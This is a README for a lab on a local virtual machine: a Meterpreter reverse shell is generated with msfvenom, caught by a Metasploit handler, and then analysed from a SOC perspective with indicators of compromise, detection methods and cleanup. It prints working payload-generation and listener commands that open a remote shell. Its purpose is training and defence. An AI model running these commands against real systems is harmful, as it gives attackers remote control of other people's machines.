# Meterpreter-reverse-shell-lab
SOC-focused cybersecurity lab demonstrating reverse shell execution, Metasploit usage, and incident analysis in a self built controlled environment.

#  Meterpreter Reverse Shell Lab – SOC Analysis (Kali Linux)
##  Project Overview

This project demonstrates a controlled cybersecurity simulation of a reverse shell attack using Metasploit Framework in a local virtual lab environment.

The objective of this exercise is not exploitation in a real-world system, but to understand:

- How attackers gain initial access  
- How reverse shell communication is established  
- How SOC analysts can detect and interpret malicious activity  
- What indicators of compromise (IOCs) are generated during exploitation  

This lab bridges offensive security concepts with defensive SOC analysis.


## Objectives

- Simulate a vulnerable low-privilege user environment  
- Generate a Linux Meterpreter reverse shell payload  
- Establish a Metasploit listener (C2 simulation)  
- Capture and analyze a Meterpreter session  
- Investigate system-level indicators of compromise  
- Perform cleanup and incident response simulation  
- Develop SOC-style interpretation of attack behavior  

## Lab Environment

- Operating System: Kali Linux  
- Network Mode: Host-only Adapter (VirtualBox)  
- Attacker IP: 192.168.56.121  
- Tools: Metasploit Framework, msfvenom, netstat, ps
  
## Tools Used
- Metasploit Framework  
- msfvenom  
- netstat  
- ps  
- Linux system utilities  

##  Methodology

 # 1. Victim User Creation
 
A low-privilege user was created to simulate a real-world compromised account:
```bash
sudo adduser victim --disabled-password --gecos ""

# 2. Payload Generation

# A Linux Meterpreter reverse shell payload was generated:

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.121 LPORT=4444 -f elf -o shell64.elf
chmod +x shell64.elf

# 3. Metasploit Listener Setup
A handler was configured to receive the reverse connection:
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.121
set LPORT 4444
run

# 4 Payload Execution
The payload was executed under the victim user:
sudo -u victim /home/victim/shell64.elf

# 5 Results
Network Evidence
192.168.56.121:4444  → 192.168.56.121:49454  ESTABLISHED
Interpretation:
Port 4444 = Metasploit listener (attacker)
Port 49454 = victim outbound connection
Status = active reverse shell session


# 6 Process Evidence
ps aux | grep shell64
Confirms execution of malicious binary
Running under victim user context


# 7 Network State
netstat -antp | grep 4444
Shows active TCP connection
Confirms Metasploit session handling via Ruby process

# 8 Inside Meterpreter session:
getuid → confirms user identity
sysinfo → system information
pwd → working directory
Insight:These commands simulate attacker reconnaissance after initial access.

# 9 Indicators of Compromise (IOCs)
Execution of unknown binary (shell64.elf)
Reverse connection on port 4444
Suspicious process under non-root user
Active outbound connection initiated internally
Metasploit Ruby handler process

# 10 SOC Analysis
This activity represents a:
Reverse Shell Compromise with Command & Control communication

# 11 Detection methods:
Network traffic monitoring
Endpoint process monitoring
Port-based anomaly detection
Suspicious binary execution alerts

# 12 Cleanup
sudo pkill -u victim
sudo rm -f /home/victim/shell64.elf
sudo deluser --remove-home victim

# 13 Key Learnings
Reverse shells initiate outbound connections from victim systems
Metasploit acts as a C2 framework
SOC analysts detect compromise through network + process correlation
IOCs are critical for incident detection
Proper cleanup simulates real incident response

# Disclaimer

This project was conducted in a controlled lab environment for educational and ethical cybersecurity training only.
